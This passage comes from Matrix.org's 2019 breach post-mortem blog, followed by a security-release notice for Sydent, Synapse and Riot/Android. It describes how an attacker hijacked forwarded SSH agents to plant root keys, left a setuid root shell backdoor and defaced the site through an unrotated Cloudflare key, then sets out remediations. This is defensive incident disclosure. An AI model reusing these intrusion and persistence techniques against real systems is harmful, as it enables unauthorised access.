<li>This allowed them to further compromise a Jenkins slave (Flywheel, an old Mac Pro used mainly for continuous integration testing of Riot/iOS and Riot/Android). The attacker put an SSH key on the box, which was unfortunately exposed to the internet via a high-numbered SSH port for ease of admin by remote users, and placed a trap which waited for any user to SSH into the jenkins user, which would then hijack any available forwarded SSH keys to try to add the attacker‚Äôs SSH key to root@ on as many other hosts as possible.</li>
<li>On Apr 4th at 12:32 GMT, one of the Riot devops team members SSH‚Äôd into the Jenkins slave to perform some admin, forwarding their SSH key for convenience for accessing other boxes while doing so.  This triggered the trap, and resulted in the majority of the malicious keys being inserted to the remote hosts.</li>
<li>From this point on, the attacker proceeded to explore the network, performing targeted exfiltration of data (e.g. our passbolt database, which is thankfully end-to-end encrypted via GPG) seemingly targeting credentials and data for use in onward exploits, and installing backdoors for later use (e.g. a setuid root shell at <code>/usr/share/bsd-mail/shroot</code>).</li>
<li>The majority of access to the hosts occurred between Apr 4th and 6th.</li>
<li>There was no evidence of large-scale data exfiltration, based on analysing network logs.</li>
<li>There was no evidence of Modular.im hosts having been compromised.  (Modular‚Äôs provisioning system and DB did run on the old infrastructure, but it was not used to tamper with the modular instances themselves).</li>
<li>There was no evidence of the identity server databases having been compromised.</li>
<li>There was no evidence of tampering in our source code repositories.</li>
<li>There was no evidence of tampering of our distributed software packages.</li>
<li>Two more hosts were compromised on Apr 5th by similarly hijacking another developer SSH agent as the dev logged into a production server.</li>
</ul>
<p>By around 2am on Apr 11th we felt that we had sufficient visibility on the attacker‚Äôs behaviour to be able to do a first pass at evicting them by locking down SSH, removing their keys, and blocking as much network traffic as we could.</p>
<p>We then started a full rebuild of the datacenter on the morning of Apr 11th, given that the only responsible course of action when an attacker has acquired root is to salt the earth and start over afresh. This meant rotating all secrets; isolating the old hosts entirely (including ones which appeared to not have been compromised, for safety), spinning up entirely new hosts, and redeploying everything from scratch with the fresh secrets.  The process was significantly slowed down by colliding with unplanned maintenance and provisioning issues in the datacenter provider and unexpected delays spent waiting to copy data volumes between datacenters, but by 1am on Apr 12th the core matrix.org server was back up, and we had enough of a website up to publish the initial <a href="https://matrix.org/blog/2019/04/11/security-incident/">security incident blog post</a>. (This was actually static HTML, faked by editing the generated WordPress content from the old website. We opted not to transition any WordPress deployments to the new infra, in a bid to keep our attack surface as small as possible going forwards).</p>
<p>Given the production database had been accessed, we had no choice but drop all access_tokens for matrix.org, to stop the attacker accessing user accounts, causing a forced logout for all users on the server.  We also recommended all users change their passwords, given the salted &amp; hashed (4096 rounds of bcrypt) passwords had likely been exfiltrated.</p>
<p>At about 4am we had enough of the bare necessities back up and running to pause for sleep.</p>
<h3 id="the-defacement">The Defacement</h3>
<p>At around 7am, we were woken up to the news that the attacker had managed to replace the matrix.org website with a defacement (as per <a href="https://github.com/vector-im/riot-web/issues/9435">https://github.com/vector-im/riot-web/issues/9435</a>). It looks like the attacker didn‚Äôt think we were being transparent enough in our initial blog post, and wanted to make it very clear that they had access to many hosts, including the production database and had indeed exfiltrated password hashes.  Unfortunately it took a few hours for the defacement to get on our radar as our monitoring infrastructure hadn‚Äôt yet been fully restored and the normal paging infrastructure wasn‚Äôt back up (we now have emergency-emergency-paging for this eventuality).</p>
<p>On inspection, it transpired that the attacker had not compromised the new infrastructure, but had used Cloudflare to repoint the DNS for matrix.org to a defacement site hosted on Github.  Now, as part of rotating the secrets which had been compromised via our configuration repositories, we had of course rotated the Cloudflare API key (used to automate changes to our DNS) during the rebuild on Apr 11.  When you log into Cloudflare, it looks something like this...</p>
<p><img src="/blog/img/cf.png" alt="Cloudflare login UI" /></p>
<p>...where the top account is your personal one, and the bottom one is an admin role account.  To rotate the admin API key, we clicked on the admin account to log in as the admin, and then went to the Profile menu, found the API keys and hit the <a href="https://support.cloudflare.com/hc/en-us/articles/221318707-How-do-I-change-my-Global-API-Key-">Change API Key</a> button.</p>
<p>Unfortunately, when you do this, it turns out that the API Key it changes is your personal one, rather than the admin one.  As a result, in our rush we thought we‚Äôd rotated the admin API key, but we hadn‚Äôt, thus accidentally enabling the defacement.</p>
<p>To flush out the defacement we logged in directly as the admin user and changed the API key, pointed the DNS back at the right place, and continued on with the rebuild.</p>
<h3 id="the-rebuild">The Rebuild</h3>
<p>The goal of the rebuild has been to get all the higher priority services back up rapidly - whilst also ensuring that good security practices are in place going forwards.  In practice, this meant making some immediate decisions about how to ensure the new infrastructure did not suffer the same issues and fate as the old.  Firstly, we ensured the most obvious mistakes that made the breach possible were mitigated:</p>
<ul>
<li>Access via SSH restricted as heavily as possible</li>
<li>SSH agent forwarding disabled server-side</li>
<li>All configuration to be managed by Ansible, with secrets encrypted in vaults, rather than sitting in a git repo.</li>
</ul>
<p>Then, whilst reinstating services on the new infra, we opted to review <strong>everything</strong> being installed for security risks, replacing with securer alternatives if needed, even if it slowed down the rebuild.  Particularly, this meant:</p>
<ul>
<li>Jenkins has been replaced by <a href="https://buildkite.com/matrix-dot-org">Buildkite</a></li>
<li>Wordpress has been replaced by static generated sites (e.g. <a href="https://github.com/matrix-org/matrix.org/tree/master/gatsby">Gatsby</a>)</li>
<li>cgit has been replaced by <a href="https://gitlab.matrix.org">gitlab</a>.</li>
<li>Entirely new packaging building, signing &amp; distribution infrastructure (more on that later)</li>
<li>etc.</li>
</ul>
<p>Now, while we restored the main synapse (homeserver), sydent (identity server), sygnal (push server), databases, load balancers, intranet and website on Apr 11, it‚Äôs important to understand that there were over 100 other services running on the infra - which is why it is taking a while to get full parity with where we were before.</p>
<p>In the interest of transparency (and to try to give a sense of scale of the impact of the breach), here is the public-facing service list we restored, showing priority (1 is top, 4 is bottom) and the % restore status as of May 4th:</p>
<p><img src="/blog/img/services.png" alt="Service status" /></p>
<p>Apologies again that it took longer to get some of these services back up than we‚Äôd preferred (and that there are still a few pending).  Once we got the top priority ones up, we had no choice but to juggle the remainder alongside remediation work, <a href="https://matrix.org/blog/2019/05/03/security-updates-sydent-1-0-3-synapse-0-99-3-1-and-riot-android-0-9-0-0-8-99-0-8-28-a/">other security work</a>, and actually working on Matrix(!), whilst ensuring that the services we restored were being restored securely.</p>
<h3 id="remediations">Remediations</h3>
<p>Once the majority of the P1 and P2 services had been restored, on Apr 24 we held a formal retrospective for the team on the whole incident, which in turn kicked off a full security audit over the entirety of our infrastructure and operational processes.</p>
<p>We‚Äôd like to share the resulting remediation plan in as much detail as possible, in order to show the approach we are taking, and in case it helps others avoid repeating the mistakes of our past. Inevitably we‚Äôre going to have to skip over some of the items, however - after all, remediations imply that there‚Äôs something that could be improved, and for obvious reasons we don‚Äôt want to dig into areas where remediation work is still ongoing.  We will aim to provide an update on these once ongoing work is complete, however.</p>
<p>We should also acknowledge that after being removed from the infra, the attacker chose to file a <a href="https://github.com/matrix-org/matrix.org/issues/371">set of Github issues</a> on Apr 12 to highlight some of the security issues that had taken advantage of during the breach.  Their actions matched the findings from our forensics on Apr 10, and their suggested remediations aligned with our plan.</p>
<p>We‚Äôve split the remediation work into the following domains.</p>
<h4 id="ssh">SSH</h4>
<p>Some of the biggest issues exposed by the security breach concerned our use of SSH, which we‚Äôll take in turn:</p>
<h5 id="ssh-agent-forwarding-should-be-disabled">SSH agent forwarding should be disabled.</h5>
<p>SSH agent forwarding is a beguilingly convenient mechanism which allows a user to ‚Äòforward‚Äô access to their private SSH keys to a remote server whilst logged in, so they can in turn access other servers via SSH from that server.  Typical uses are to make it easy to copy files between remote servers via scp or rsync, or to interact with a SCM system such as Github via SSH from a remote server.  Your private SSH keys end up available for use by the server for as long as you are logged into it, letting the server impersonate you.</p>
<p>The common wisdom on this tends to be something like: ‚ÄúOnly use agent forwarding when connecting to trusted hosts‚Äù.  For instance, <a href="https://developer.github.com/v3/guides/using-ssh-agent-forwarding/#setting-up-ssh-agent-forwarding">Github‚Äôs guide to using SSH agent forwarding</a> says: </p>
<blockquote>
<p><strong>Warning</strong>: You may be tempted to use a wildcard like <code>Host *</code> to just apply this setting (ForwardAgent: yes) to all SSH connections. That's not really a good idea, as you'd be sharing your local SSH keys with <em>every</em> server you SSH into. They won't have direct access to the keys, but they will be able to use them <em>as you</em> while the connection is established. <strong>You should only add servers you trust and that you intend to use with agent forwarding</strong></p>
</blockquote>
<p>As a result, several of the team doing ops work had set <code>Host *.matrix.org ForwardAgent: yes</code> in their ssh client configs, thinking ‚Äúwell, what <em>can</em> we trust if not our own servers?‚Äù</p>
<p>This was a massive, massive mistake.</p>
<p>If there is one lesson everyone should learn from this whole mess, it is: <strong>SSH agent forwarding is incredibly unsafe, and in general you should never use it.</strong>  Not only can malicious code running on the server as that user (or root) hijack your credentials, but your credentials can in turn be used to access hosts behind your network perimeter which might otherwise be inaccessible.  All it takes is someone to have snuck malicious code on your server waiting for you to log in with a forwarded agent, and <em>boom</em>, even if it was just a one-off <code>ssh -A</code>.</p>
<p>Our remediations for this are:</p>
<ul>
<li>Disable all ssh agent forwarding on the servers.</li>
<li>If you need to jump through a box to ssh into another box, use <code>ssh -J $host</code>.</li>
<li>This can also be used with rsync via <code>rsync -e &quot;ssh -J $host&quot;</code></li>
<li>If you need to copy files between machines, use rsync rather than scp (OpenSSH 8.0‚Äôs <a href="https://www.openssh.com/txt/release-8.0">release notes</a> explicitly recommends using more modern protocols than scp).</li>
<li>If you need to regularly copy stuff from server to another (or use SSH to GitHub to check out something from a private repo), it might be better to have a specific SSH ‚Äòdeploy key‚Äô created for this, stored server-side and only able to perform limited actions.</li>
<li>If you just need to check out stuff from public git repos, use https rather than git+ssh.</li>
<li>Try to educate everyone on the perils of SSH agent forwarding: if our past selves can‚Äôt be a good example, they can at least be a horrible warning...</li>
</ul>
<p>Another approach could be to allow forwarding, but configure your SSH agent to prompt whenever a remote app tries to access your keys.  However, not all agents support this (OpenSSH‚Äôs does via <code>ssh-add -c</code>, but gnome-keyring for instance doesn‚Äôt), and also it might still be possible for a hijacker to race with the valid request to hijack your credentials.</p>
<h5 id="ssh-should-not-be-exposed-to-the-general-internet">SSH should not be exposed to the general internet</h5>
<p>Needless to say, SSH is no longer exposed to the general internet.  We are rolling out a VPN as the main access to dev network, and then SSH bastion hosts to be the only access point into production, using SSH keys to restrict access to be as minimal as possible.</p>
<h5 id="ssh-keys-should-give-minimal-access">SSH keys should give minimal access</h5>
<p>Another major problem factor was that individual SSH keys gave very broad access. We have gone through ensuring that SSH keys grant the least privilege required to the users in question. Particularly, root login should not be available over SSH.</p>
<p>A typical scenario where users might end up with unnecessary access to production are developers who simply want to push new code or check its logs.  We are mitigating this by switching over to using continuous deployment infrastructure everywhere rather than developers having to actually SSH into production.  For instance, the new <a href="https://matrix.org/blog">matrix.org blog</a> is continuously deployed into production by Buildkite from <a href="https://github.com/matrix-org/matrix.org">GitHub</a> without anyone needing to SSH anywhere.  Similarly, logs should be available to developers from a logserver in real time, without having to SSH into the actual production host. We‚Äôve already been experimenting internally with sentry for this.</p>
<p>Relatedly, we‚Äôve also shifted to requiring multiple SSH keys per user (per device, and for privileged / unprivileged access), to have finer grained granularity over locking down their permissions and revoking them etc.  (We had actually already started this process, and while it didn‚Äôt help prevent the attack, it did assist with forensics).</p>
<h5 id="two-factor-authentication">Two factor authentication</h5>
<p>We are rolling out two-factor authentication for SSH to ensure that even if keys are compromised (e.g. via forwarding hijack), the attacker needs to have also compromised other physical tokens in order to successfully authenticate.</p>
<h5 id="it-should-be-made-as-hard-as-possible-to-add-malicious-ssh-keys">It should be made as hard as possible to add malicious SSH keys</h5>
<p>We‚Äôve decided to stop users from being able to directly manage their own SSH keys in production via <code>~/.ssh/authorized_keys</code> (or <code>~/.ssh/authorized_keys2</code> for that matter) - we can see no benefit from letting non-root users set keys.</p>
<p>Instead, keys for all accounts are managed exclusively by Ansible via <code>/etc/ssh/authorized_keys/$account</code> (using sshd‚Äôs <code>AuthorizedKeysFile /etc/ssh/authorized_keys/%u</code> directive).</p>
<h5 id="changes-to-ssh-keys-should-be-carefully-monitored">Changes to SSH keys should be carefully monitored</h5>
<p>If we‚Äôd had sufficient monitoring of the SSH configuration, the breach could have been caught instantly.  We are doing this by managing the keys exclusively via Ansible, and also improving our intrusion detection in general.</p>
<p>Similarly, we are working on tracking changes and additions to other credentials (and enforcing their complexity).</p>
<h5 id="ssh-config-should-be-hardened-disabling-unnecessary-options">SSH config should be hardened, disabling unnecessary options</h5>
<p>If we‚Äôd gone through reviewing the default sshd config when we set up the datacenter in the first place, we‚Äôd have caught several of these failure modes at the outset.  We‚Äôve now done so (as per above).</p>
<p>We‚Äôd like to recommend that packages of openssh start having secure-by-default configurations, as a number of the old options just don‚Äôt need to exist on most newly provisioned machines. </p>
<h4 id="network-architecture">Network architecture</h4>
<p>As mentioned in the History section, the legacy network infrastructure effectively grew organically, without really having a core network or a good split between different production environments.</p>
<p>We are addressing this by:</p>
<ul>
<li>Splitting our infrastructure into strictly separated service domains, which are firewalled from each other and can only access each other via their respective ‚Äòfront doors‚Äô (e.g. HTTPS APIs exposed at the loadbalancers).
<ul>
<li>Development</li>
<li>Intranet</li>
<li>Package Build (airgapped; see below for more details)</li>
<li>Package Distribution</li>
<li>Production, which is in turn split per class of service.</li>
</ul>
</li>
<li>Access to these networks will be via VPN + SSH jumpboxes (as per above).  Access to the VPN is via per-device certificate + 2FA, and SSH via keys as per above.</li>
<li>Switching to an improved internal VPN between hosts within a given network environment (i.e. we don‚Äôt trust the datacenter LAN).</li>
</ul>
<p>We‚Äôre also running most services in containers by default going forwards (previously it was a bit of a mix of running unix processes, VMs, and occasional containers), providing an additional level of namespace isolation. </p>
<h4 id="keeping-patched">Keeping patched</h4>
<p>Needless to say, this particular breach would not have happened had we kept the public-facing Jenkins patched (although there would of course still have been scope for a 0-day attack).</p>
<p>Going forwards, we are establishing a formal regular process for deploying security updates rather than relying on spotting security advisories on an ad hoc basis. We are now also setting up regular vulnerability scans against production so we catch any gaps before attackers do.</p>
<p>Aside from our infrastructure, we‚Äôre also extending the process of regularly checking for security updates to also checking for outdated dependencies in our distributed software (Riot, Synapse, etc) too, given the discipline to regularly chase outdated software applies equally to both.</p>
<p>Moving all our machine deployment and configuration into Ansible allows this to be a much simpler task than before.</p>
<h4 id="intrusion-detection">Intrusion detection</h4>
<p>There‚Äôs obviously a lot we need to do in terms of spotting future attacks as rapidly as possible.  Amongst other strategies, we‚Äôre working on real-time log analysis for aberrant behaviour.</p>
<h4 id="incident-management">Incident management</h4>
<p>There is much we have learnt from managing an incident at this scale. The main highlights taken from our internal retrospective are:</p>
<ul>
<li>The need for a single incident manager to coordinate the technical response and coordinate prioritisation and handover between those handling the incident. (We lacked a single incident manager at first, given several of the team started off that week on holiday...)</li>
<li>The benefits of gathering all relevant info and checklists onto a canonical set of shared documents rather than being spread across different chatrooms and lost in scrollback.</li>
<li>The need to have an existing inventory of services and secrets available for tracking progress and prioritisation</li>
<li>The need to have a general incident management <a href="https://news.ycombinator.com/item?id=19682451&amp;p=2">checklist</a> for future reference, which folks can familiarise themselves with ahead of time to avoid stuff getting forgotten.  The sort of stuff which will go on our checklist in future includes:
<ul>
<li>Remembering to appoint named incident manager, external comms manager &amp; internal comms manager. (They could of course be the same person, but the roles are distinct).</li>
<li>Defining a sensible sequence of forensics, mitigations, communication, rotating secrets etc is followed rather than having to work it out on the fly and risk forgetting stuff</li>
<li>Remembering to informing the ICO (Information Commissioner Office) of any user data breaches</li>
<li>Guidelines on how to balance between forensics and rebuilding (i.e. how long to spend on forensics, if at all, before pulling the plug)</li>
<li>Reminders to snapshot systems for forensics &amp; backups</li>
<li>Reminder to not redesign infrastructure during a rebuild.  There were a few instances where we lost time by seizing the opportunity to try to fix design flaws whilst rebuilding, some of which were avoidable.</li>
<li>Making sure that communication isn‚Äôt sent prematurely to users (e.g. we posted the blog post asking people to update their passwords before password reset had actually been restored - apologies for that.)</li>
</ul>
</li>
</ul>
<h4 id="configuration-management">Configuration management</h4>
<p>One of the major flaws once the attacker was in our network was that our internal configuration git repo was cloned on most accounts on most servers, containing within it a plethora of unencrypted secrets.  Config would then get symlinked from the checkout to wherever the app or OS needed it.</p>
<p>This is bad in terms of leaving unencrypted secrets (database passwords, API keys etc) lying around everywhere, but also in terms of being able to automatically maintain configuration and spot unauthorised configuration changes.</p>
<p>Our solution is to switch all configuration management, from the OS upwards, to Ansible (which we had already established for Modular.im), using Ansible vaults to store the encrypted secrets.  It‚Äôs unfortunate that we had already done the work for this (and even had been <a href="https://github.com/ansible-community/ansible-london-meetup/blob/master/presentations/2019-01-31/Introducing%20Ansible%20to%20matrix-final.pdf">giving talks at Ansible meetups</a> about it!) but had not yet applied it to the legacy infrastructure.</p>
<h4 id="avoiding-temporary-measures-which-last-forever">Avoiding temporary measures which last forever</h4>
<p>None of this would have happened had we been more disciplined in finishing off the temporary infrastructure from back in 2017.  As a general point, we should try and do it right the first time - and failing that, assign responsibility to someone to update it and assign responsibility to someone else to check. In other words, the only way to dig out of temporary measures like this is to project manage the update or it will not happen.  This is of course a general point not specific to this incident, but one well worth reiterating.</p>
<h4 id="secure-packaging">Secure packaging</h4>
<p>One of the most unfortunate mistakes highlighted by the breach is that the signing keys for the Synapse debian repository, Riot debian repository and Riot/Android releases on the Google Play Store had ended up on hosts which were compromised during the attack.  This is obviously a massive fail, and is a case of the geo-distributed dev teams prioritising the convenience of a near-automated release process without thinking through the security risks of storing keys on a production server.</p>
<p>Whilst the keys were compromised, none of the packages that we distribute were tampered with. However, the impact on the project has been high - particularly for Riot/Android, as we cannot allow the risk of an attacker using the keys to sign and somehow distribute malicious variants of Riot/Android, and Google provides no means of recovering from a compromised signing key beyond creating a whole new app and starting over.  Therefore we have lost all our ratings, reviews and download counts on Riot/Android and <a href="https://medium.com/@RiotChat/riot-im-android-security-update-2b3f655ad739">started over</a>.  (If you want to give the newly released app a fighting chance despite this setback, feel free to <a href="https://play.google.com/store/apps/details?id=im.vector.app&amp;showAllReviews=true">give it some stars</a> on the Play Store). We also revoked the compromised Synapse &amp; Riot GPG keys and created new ones (and published <a href="https://github.com/matrix-org/synapse/commit/95c603ae6f0f1639f6299fff62d7a75002221276#diff-7d442b7eb49f5fc377f51e74b291cfc1">new instructions</a> for how to securely set up your Synapse or Riot debian repos).</p>
<p>In terms of remediation, designing a secure build process is surprisingly hard, particularly for a geo-distributed team.  What we have landed on is as follows:</p>
<ul>
<li>Developers create a release branch to signify a new release (ensuring dependencies are pinned to known good versions).</li>
<li>We then perform all releases from a dedicated isolated release terminal.
<ul>
<li>This is a device which is kept disconnected from the internet, other than when doing a release, and even then it is firewalled to be able to pull data from SCM and push to the package distribution servers, but otherwise entirely isolated from the network.</li>
<li>Needless to say, the device is strictly used for <em>nothing</em> other than performing releases.</li>
<li>The build environment installation is scripted and installs on a fresh OS image (letting us easily build new release terminals as needed)</li>
<li>The signing keys (hardware or software) are kept exclusively on this device.</li>
<li>The publishing SSH keys (hardware or software) used to push to the packaging servers are kept exclusively on this device.</li>
<li>We physically store the device securely.</li>
<li>We ensure someone on the team always has physical access to it in order to do emergency builds.</li>
</ul>
</li>
<li>Meanwhile, releases are distributed using dedicated infrastructure, entirely isolated from the rest of production.
<ul>
<li>These live at <a href="https://packages.matrix.org">https://packages.matrix.org</a> and <a href="https://packages.riot.im">https://packages.riot.im</a></li>
<li>These are minimal machines with nothing but a static web-server.</li>
<li>They are accessed only via the dedicated SSH keys stored on the release terminal.</li>
<li>These in turn can be mirrored in future to avoid a SPOF (or we could cheat and use Cloudflare‚Äôs <a href="https://www.cloudflare.com/always-online/">always online</a> feature, for better or worse).</li>
</ul>
</li>
</ul>
<p>Alternatives here included:</p>
<ul>
<li>In an ideal world we‚Äôd do reproducible builds instead, and sign the build‚Äôs hash with a hardware key, but given we don‚Äôt have reproducible builds yet this will have to suffice for now.</li>
<li>We could delegate building and distribution entirely to a 3rd party setup such as OBS (as per <a href="https://github.com/matrix-org/matrix.org/issues/370">https://github.com/matrix-org/matrix.org/issues/370</a>).  However, we have a very wide range of artefacts to build across many different platforms and OSes, so would rather build ourselves if we can.</li>
</ul>
<h4 id="dev-and-ci-infrastructure">Dev and CI infrastructure</h4>
<p>The main change in our dev and CI infrastructure is to move from Jenkins to <a href="https://buildkite.com/matrix-dot-org">Buildkite</a>.  The latter has been serving us well for Synapse builds over the last few months, and has now been extended to serve all the main CI pipelines that Jenkins was providing.  Buildkite works by orchestrating jobs on a elastic pool of CI workers we host in our own AWS, and so far has done so quite painlessly.</p>
<p>The new pipelines have been set up so that where CI needs to push artefacts to production for continuous deployment (e.g. <a href="riot.im/develop">riot.im/develop</a>), it does so by poking production via HTTPS to trigger production to pull the artefact from CI, rather than pushing the artefact via SSH to production.</p>
<p>Other than CI, our strategy is:</p>
<ul>
<li>Continue using Github for public repositories</li>
<li>Use gitlab.matrix.org for private repositories (and stuff which we don‚Äôt want to re-export via the US, like <a href="https://gitlab.matrix.org/matrix-org/olm">Olm</a>)</li>
<li>Continue to host docker images on Docker Hub (despite their recent <a href="https://success.docker.com/article/docker-hub-user-notification">security dramas</a>).</li>
</ul>
<h4 id="log-minimisation-and-handling-personally-identifying-information-pii">Log minimisation and handling Personally Identifying Information (PII)</h4>
<p>Another thing that the breach made painfully clear is that we log too much.  While there‚Äôs not much evidence of the attacker going spelunking through any Matrix service log files, the fact is that whilst developing Matrix we‚Äôve kept logging on matrix.org relatively verbose to help with debugging.  There‚Äôs nothing more frustrating than trying to trace through the traffic for a bug only to discover that logging didn‚Äôt pick it up.</p>
<p>However, we can still improve our logging and PII-handling substantially:</p>
<ul>
<li>Ensuring that wherever possible, we hash or at least truncate any PII before logging it (access tokens, matrix IDs, 3rd party IDs etc).</li>
<li>Minimising log retention to the bare minimum we need to investigate recent issues and abuse</li>
<li>Ensuring that PII is stored hashed wherever possible.</li>
</ul>
<p>Meanwhile, in Matrix itself we already are very mindful of handling PII (c.f. our <a href="https://github.com/vector-im/policies/tree/master/docs/matrix-org">privacy policies</a> and <a href="https://matrix.org/blog/2018/05/08/gdpr-compliance-in-matrix/">GDPR work</a>), but there is also more we can do, particularly:</p>
<ul>
<li>Turning on end-to-end encryption by default, so that even if a server is compromised, the attacker cannot get at private message history.  Everyone who uses E2EE in Matrix should have felt some relief that even though the server was compromised, their message history was safe: we need to provide that to everyone.  This is <a href="https://github.com/vector-im/riot-web/issues/6779">https://github.com/vector-im/riot-web/issues/6779</a>.</li>
<li>We need device audit trails in Matrix, so that even if a compromised server (or malicious server admin) temporarily adds devices to your account, you can see what‚Äôs going on.  This is <a href="https://github.com/matrix-org/synapse/issues/5145">https://github.com/matrix-org/synapse/issues/5145</a></li>
<li>We need to empower users to configure history retention in their rooms, so they can limit the amount of history exposed to an attacker. This is <a href="https://github.com/matrix-org/matrix-doc/pull/1763">https://github.com/matrix-org/matrix-doc/pull/1763</a></li>
<li>We need to provide account portability (aka decentralised accounts) so that even if a server is compromised, the users can seamlessly migrate elsewhere. The first step of this is <a href="https://github.com/matrix-org/matrix-doc/pull/1228">https://github.com/matrix-org/matrix-doc/pull/1228</a>.</li>
</ul>
<h3 id="conclusion">Conclusion</h3>
<p>Hopefully this gives a comprehensive overview of what happened in the breach, how we handled it, and what we are doing to protect against this happening in future.</p>
<p>Again, we‚Äôd like to apologise for the massive inconvenience this caused to everyone caught in the crossfire. Thank you for your patience and for sticking with the project whilst we restored systems. And while it is very unfortunate that we ended up in this situation, at least we should be coming out of it much stronger, at least in terms of infrastructure security.  We‚Äôd also like to particularly thank <a href="https://www.linkedin.com/in/kade-morton-34179283/">Kade Morton</a> for providing independent review of this post and our remediations, and everyone who reached out with #hugops during the incident (it was literally the only positive thing we had on our radar), and finally thanks to the those of the Matrix team who hauled ass to rebuild the infrastructure, and also those who doubled down meanwhile to keep the rest of the project on track.</p>
<p>On which note, we‚Äôre going to go back to building decentralised communication protocols and reference implementations for a bit...  Emoji reactions are on the horizon (at last!), as is Message Editing, RiotX/Android and a host of other long-awaited features - not to mention finally releasing Synapse 1.0.  So: thanks again for flying Matrix, even during this period of extreme turbulence and, uh, hijack.  Things should mainly be back to normal now and for the foreseeable.</p>
<p><i>Given the new blog doesn't have comments yet, feel free to discuss the post over at <a href="https://news.ycombinator.com/item?id=19857744">HN</a>.</i></p>

                
            </div>
        </article>
        
        <article class="post">
            <header>
                <h2><a href="&#x2F;blog&#x2F;2019&#x2F;05&#x2F;03&#x2F;security-updates-sydent-1-0-3-synapse-0-99-3-1-and-riot-android-0-9-0-0-8-99-0-8-28a&#x2F;" title="Security updates: Sydent 1.0.3, Synapse 0.99.3.1 and Riot&#x2F;Android 0.9.0 &#x2F; 0.8.99 &#x2F; 0.8.28a">Security updates: Sydent 1.0.3, Synapse 0.99.3.1 and Riot&#x2F;Android 0.9.0 &#x2F; 0.8.99 &#x2F; 0.8.28a</a></h2>
                <span>
                    03.05.2019 00:00
                    ‚Äî
                    <a href="/category/general">
                        General
                    </a>
                    ‚Äî
                    <a
                        href="/author/matthew-hodgson">
                        Matthew Hodgson
                    </a>
                </span>
                
            </header>
            <div>
                
                <p>Hi all,</p>
<p>Over the last few weeks we‚Äôve ended up getting a lot of attention from the security research community, which has been incredibly useful and massively appreciated in terms of contributions to improve the security of the reference Matrix implementations.</p>
<p>We‚Äôve also set up an official <a href="https://matrix.org/security-disclosure-policy/">Security Disclosure Policy</a> to explain the process of reporting security issues to us safely via responsible disclosure - including a Hall of Fame to credit those who have done so.  (Please mail <a href="mailto:security@matrix.org">security@matrix.org</a> to remind us if we‚Äôve forgotten you!).</p>
<p>Since we published the Hall of Fame yesterday, we‚Äôve already been getting new entries and so we‚Äôre doing a set of security releases today to ensure they are mitigated asap.  Unfortunately the work around this means that we‚Äôre running late in publishing the post mortem of the <a href="https://matrix.org/blog/2019/04/11/security-incident">Apr 11 security incident</a> - we are trying to get that out as soon as we can.</p>
<h2 id="sydent-1-0-3">Sydent 1.0.3</h2>
<p>Sydent 1.0.3 has three security fixes:</p>
<ul>
<li>Ensure that authentication tokens are generated using a secure random number generator, ensuring they cannot be predicted by an attacker.  This is an important fix - please update.  Thanks to Enguerran Gillier (<a href="https://twitter.com/@opnsec">@opnsec</a>) for identifying and responsibly disclosing the issue!</li>
<li>Mitigate an HTML injection bug where an invalid room_id could result in malicious HTML being injected into validation emails.  <strong>The fix for this is in the email template itself; you will need to update any customised email templates to be protected.</strong>  Thanks to Enguerran Gillier (<a href="https://twitter.com/@opnsec">@opnsec</a>) for identifying and responsibly disclosing this issue too!</li>
<li>Randomise session_ids to avoid leaking info about the total number of identity validations, and whether a given ID has been validated.  Thanks to <a href="https://fs0c131y.com">@fs0c131y</a> for identifying and responsibly disclosing this one.</li>
</ul>
<p>If you are running Sydent as an identity server, you should update as soon as possible from <a href="https://github.com/matrix-org/sydent/releases/v1.0.3">https://github.com/matrix-org/sydent/releases/v1.0.3</a>.  We are not aware of any of these issues having been exploited maliciously in the wild.</p>
<h2 id="synapse-0-99-3-1">Synapse 0.99.3.1</h2>
<p>Synapse 0.99.3.1 is a security update for two fixes:</p>
<ul>
<li>Ensure that random IDs in Synapse are generated using a secure random number generator, ensuring they cannot be predicted by an attacker. Thanks to Enguerran Gillier (<a href="https://twitter.com/@opnsec">@opnsec</a>) for identifying and responsibly disclosing this issue!</li>
<li>Add 0.0.0.0/32 and ::/128 to the URL preview blacklist configuration, ensuring that an attacker cannot make connections to localhost. Thanks to Enguerran Gillier (<a href="https://twitter.com/@opnsec">@opnsec</a>) for identifying and responsibly disclosing this issue too!</li>
</ul>
<p>You can update from <a href="https://github.com/matrix-org/synapse/releases">https://github.com/matrix-org/synapse/releases</a> or similar as normal. We are not aware of any of these issues having been exploited maliciously in the wild.</p>
<p>(Synapse 0.99.3.2 was released shortly afterwards to fix a non-security issue with the Debian packaging)</p>
<h2 id="riot-android-0-9-x-0-8-99-google-play-and-0-8-28a-f-droid">Riot/Android 0.9.x/0.8.99 (Google Play) and 0.8.28a (F-Droid)</h2>
<p>Riot/Android has an important security fix which shipped over the course of the last week in various versions of the app:</p>
<ul>
<li>Remove obsolete and buggy ContentProvider which could allow a malicious local app to compromise account data. Many thanks to Julien Thomas (<a href="https://twitter.com/@julien_thomas">@julien_thomas</a>) from <a href="https://protektoid.com">Protektoid Project</a> for identifying this and responsibly disclosing it!</li>
</ul>
<p>The fix for this shipped on F-Droid since 0.8.28a, and on the Play Store, the fix is present in both v0.9.0 (the first version of the re-published Riot app) and v0.8.99 (the last version of the old Riot app, which told everyone to reinstall).  Other forks of Riot which we‚Äôre aware of have also been informed and should be updated.</p>
<p>If you haven‚Äôt already updated, please do so now.</p>

                
            </div>
        </article>
        
        <nav class="pagination">
    <div class="prev">
        
    </div>
    <span class="page-number">1 / 10</span>
    <div class="prev">
        
        <a href="&#x2F;category&#x2F;general&#x2F;page&#x2F;2&#x2F;">Next ‚Ä∫</a>
        
    </div>
</nav>

    </div>
</div>

    </main>

    <footer class="site-footer">
    <div class="internal-links">
        
        <a href="&#x2F;faq">FAQs</a>
        
        <a href="&#x2F;security-disclosure-policy">Security Disclosure Policy</a>
        
        <a href="&#x2F;hall-of-fame">Security Hall of Fame</a>
        
        <a href="&#x2F;legal&#x2F;code-of-conduct">Code of Conduct for Matrix.org</a>
        
        <a href="&#x2F;legal">Legal</a>
        
        <a href="&#x2F;contact">Contact</a>
        
        <a href="https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;">Site Source</a>
        
    </div>
    <div class="external-links">
        <div>
            
            <a href="&#x2F;code"><img src="/assets/github.svg" alt="GitHub"></a>
            
            <a href="https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;"><img src="/assets/gitlab.svg" alt="GitLab"></a>
            
            <a href="https:&#x2F;&#x2F;mastodon.matrix.org&#x2F;@matrix"><img src="/assets/mastodon.svg" alt="Mastodon"></a>
            
